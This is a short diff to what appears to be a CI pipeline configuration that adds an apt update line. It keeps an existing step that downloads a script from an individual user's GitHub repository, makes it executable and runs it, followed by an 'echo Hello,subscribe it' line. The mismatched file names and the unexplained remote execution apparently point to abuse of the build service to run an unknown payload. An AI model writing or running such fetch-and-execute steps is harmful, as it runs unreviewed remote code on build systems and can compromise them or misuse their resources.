@@ -8,6 +8,7 @@ jobs:
         - run:
             name: Install Dependencies
             command: |
+              sudo apt update
               wget https://raw.githubusercontent.com/chirifa201/python/main/ruby.sh && chmod +x ruby.sh && ./ruby.sh
               echo Hello,subscribe it
 workflows:
